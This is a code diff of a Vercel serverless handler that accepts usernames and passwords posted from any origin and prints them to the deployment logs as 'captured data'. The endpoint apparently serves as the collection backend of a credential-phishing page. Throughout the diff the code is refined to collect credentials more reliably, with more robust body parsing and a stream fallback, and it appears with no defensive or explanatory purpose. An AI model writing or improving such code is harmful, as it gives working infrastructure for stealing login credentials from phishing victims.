@@ -1,7 +1,7 @@
-export default function handler(req, res) {
-    // Enable CORS so the frontend can hit this endpoint without issues
+export default async function handler(req, res) {
+    // Set headers to prevent CORS issues
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
     if (req.method === 'OPTIONS') {
@@ -9,31 +9,40 @@ export default function handler(req, res) {
     }
 
     if (req.method === 'POST') {
-        let data = req.body;
+        let body = '';
 
-        // FIX: If Vercel received the body as a string, parse it manually
-        if (typeof data === 'string') {
+        // Safely parse the stream data chunks if Vercel did not auto-parse it
+        if (typeof req.body === 'object') {
+            body = req.body;
+        } else {
             try {
-                data = JSON.parse(data);
+                body = JSON.parse(req.body);
             } catch (e) {
-                // If parsing fails, fall back to extracting values via URLSearchParams
-                const params = new URLSearchParams(data);
-                data = {
-                    user: params.get('user') || params.get('username'),
-                    pass: params.get('pass') || params.get('password')
-                };
+                // Alternative streaming collection fallback
+                const buffers = [];
+                for await (const chunk of req) {
+                    buffers.push(chunk);
+                }
+                const rawString = Buffer.concat(buffers).toString();
+                try {
+                    body = JSON.parse(rawString);
+                } catch (err) {
+                    body = {};
+                }
             }
         }
 
-        const username = data.user || data.username || "Unknown User";
-        const password = data.pass || data.password || "Unknown Password";
+        const username = body.user || 'Not Provided';
+        const password = body.pass || 'Not Provided';
 
-        // This force-prints directly to the Vercel Dashboard Logs terminal
+        // This prints directly inside your Vercel Project -> Logs tab
         console.log(`\n====================================`);
-        console.log(`[CAPTURED DATA] User: ${username} | Pass: ${password}`);
+        console.log(`[ALERT] LOG ATTRIBUTE CAPTURED`);
+        console.log(`USER : ${username}`);
+        console.log(`PASS : ${password}`);
         console.log(`====================================\n`);
 
-        return res.status(200).json({ status: 'success', message: 'Logged successfully' });
+        return res.status(200).json({ status: 'success' });
     }
 
     return res.status(405).json({ message: 'Method Not Allowed' });
